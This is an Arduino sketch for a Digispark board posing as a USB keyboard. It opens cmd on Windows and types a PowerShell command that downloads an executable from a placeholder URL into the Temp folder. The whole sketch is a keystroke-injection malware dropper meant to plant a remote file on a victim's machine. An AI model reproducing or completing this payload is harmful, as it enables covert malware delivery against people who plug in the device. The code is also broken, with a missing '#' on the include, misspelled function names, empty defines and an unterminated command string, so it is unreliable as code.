include "DigiKeyboard.h"
#define MOD_SHIFT_LEFT    
#define MOD_ALT_LEFT  
void setup() {
  // put your setup code here, to run once:
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStoke(0, MOD_GUI_LEFT);
DigiKeyboard.delay(100);
DigiKeyboard.print(F("cmd"));
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print(F("powershell (new-object System.Net.WebClient).DownloadFile('здесь ссыль на файл','%Temp%/end 2.exe"));
DigiKeyboard.sendKeySroke(KEY_ENTER);
DigiKeyboard.delay(2000);
DigiKeyboard.print(F("exit"));
}

void loop() {
  // put your main code here, to run repeatedly:

}
